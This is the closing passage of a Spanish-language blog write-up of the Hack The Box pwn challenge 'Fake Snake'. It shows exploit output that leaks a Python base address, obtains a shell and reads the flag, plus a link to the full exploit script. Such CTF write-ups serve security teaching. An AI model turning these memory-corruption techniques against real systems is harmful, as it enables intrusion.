    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1337: Done
[<span class="code-blue">*</span>] id(0) = 0x7f7614caf288
[<span class="code-green">+</span>] Python base address: 0x7f761478b000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> cat flag.txt
HTB{fake_flag_for_testing}
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Consigamos la <em>flag</em> en la instancia remota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 157.245.41.35:30659
[<span class="code-blue">*</span>] './libpython3.11.so.1.0'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 157.245.41.35 on port 30659: Done  
[<span class="code-blue">*</span>] id(0) = 0x7f25a2590288
[<span class="code-green">+</span>] Python base address: 0x7f25a206c000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> cat flag.txt
HTB{f4k3_0bj3ct5_4r3_p0w3rfu11}
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Fake%20Snake/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#entorno-de-configuración">Entorno de configuración</a></li><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-información">Función de información</a></li></ul></li><li><a href="#aprendiendo-python-_internals_">Aprendiendo Python <em>internals</em></a><ul><li><a href="#objetos-de-python">Objetos de Python</a></li><li><a href="#_fake-objects_"><em>Fake objects</em></a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#primitiva-_fake-object_">Primitiva <em>fake object</em></a></li><li><a href="#arreglando-el-_exploit_">Arreglando el <em>exploit</em></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2025</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>